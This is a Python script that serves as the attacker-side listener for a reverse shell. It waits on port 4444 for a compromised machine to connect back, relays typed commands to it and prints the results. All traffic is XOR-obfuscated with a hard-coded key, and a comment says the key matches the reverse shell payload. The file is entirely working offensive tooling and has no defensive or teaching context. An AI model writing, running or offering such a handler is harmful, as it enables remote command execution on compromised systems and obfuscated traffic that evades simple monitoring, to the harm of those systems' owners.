import socket
import threading
import sys

KEY = 0x5A  # Same XOR key used in the reverse shell

def xor_data(data: bytes) -> bytes:
    return bytes(b ^ KEY for b in data)

def receive_thread(sock):
    while True:
        try:
            data = sock.recv(1024)
            if not data:
                print("\n[Disconnected]")
                break
            sys.stdout.write(xor_data(data).decode(errors="replace"))
            sys.stdout.flush()
        except Exception as e:
            print(f"\n[Recv Error] {e}")
            break

def main():
    ip = "0.0.0.0"       # Listen on all interfaces
    port = 4444          # Same port as in your shell

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(1)

    print(f"[+] Waiting for connection on {ip}:{port}...")
    conn, addr = listener.accept()
    print(f"[+] Connected from {addr[0]}:{addr[1]}\n")

    # Start receiving output in a separate thread
    threading.Thread(target=receive_thread, args=(conn,), daemon=True).start()

    # Main loop for sending input
    try:
        while True:
            cmd = input()
            if cmd.strip().lower() in ("exit", "quit"):
                break
            conn.send(xor_data(cmd.encode() + b"\n"))
    except KeyboardInterrupt:
        pass

    conn.close()
    print("\n[+] Connection closed.")

if __name__ == "__main__":
    main()
